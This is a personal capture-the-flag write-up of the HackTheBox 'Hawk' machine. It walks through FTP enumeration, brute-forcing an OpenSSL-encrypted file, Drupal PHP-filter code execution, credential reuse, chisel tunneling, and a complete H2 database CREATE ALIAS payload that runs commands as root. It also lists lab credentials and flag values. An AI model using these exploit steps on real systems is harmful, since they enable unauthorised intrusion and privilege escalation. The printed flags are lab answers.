```json
Alias: Hawk
Date: 22-08_2024
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.129.95.193
```

# Hawk
# Summary

- Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-22 12:58 PKT
Nmap scan report for 10.129.95.193
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.74 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

We have ftp with anonymous login allowed, so lets start with that.

The ftp has a directory named messages and at first sight it's empty, but it contains a dot file we can list by `ls -a`.

The file contains a base64 string, after decoding it we get some bytes starting with the prefix `Salted__`. Searching for this in google shows that it's an openssl encryption.

And that brings us to [this](https://github.com/glv2/bruteforce-salted-openssl) repository. Lets try to crack the password by selecting the most common encryption method, AES256.

`bruteforce-salted-openssl -f ~/Documents/Wordlists/rockyou.txt -c aes256 enc`

And this will return the password: `friends`

to decrypt the message we can use openssl.

`openssl enc -d -aes256 -salt -in enc -out decrypted.file`

And we get a password. This password is for the Drupal CMS running on port 80.

| Username | Password                 |
| -------- | ------------------------ |
| admin    | PencilKeyboardScanner123 |

---

# Exploitation

To get code execution:
1. Go to Modules->Enable PHP Filter-> Save Configuration
2. Add Content->Basic Page

```php
<?php
    //Reverse shell
?>
```

3. Make sure to choose PHP Code from the drop down of Text format
4. Save, it should redirect you to the page, Which should be `$IP/node/<id>`

And we should get a shell as Daniel. The `sites/default/settings.php` contains the password for the database and it is a case of password reuse.

| Username | Password    |
| -------- | ----------- |
| daniel   | drupal4hawk |

login using ssh, and you will find that Daniel is a madman who has python as his default shell. We can run bash interactively by

```python
import subprocess

subprocess.run(['/bin/bash'])
```

---
# Privilege Escalation

We remember from the nmap that H2Console is running on port 8082, which is an interface to H2Database. We can use chisel to do some port tunneling and access that. Transfer chisel to the server.

Start listening on your machine.
`./chisel server --reverse`

Run the client on the box
`./chisel client 10.10.14.188:8080 R:8082:0.0.0.0:8082`

Now we should be able to access the Console on localhost:8082

Trying the default password on the host doesn't work, but fear not. We can simply change the JDBC URL to point to a new location and a new database will be created there with default `sa` user and empty pass.

The database is running as user root so we simply need to get code execution,

Create this alias

```sql
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }$$;
```

and pwn: `CALL REVEXEC('cat /root/root.txt');`

---

# Flags
- 0ec8c1fb479801f9cf21d1fac1d86c2c
- c13aecf90e852a46fbd01870cf241b41

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Linux #Cryptography #WebApp #WebApp/Drupal #Linux/CredentialHunting #H2Database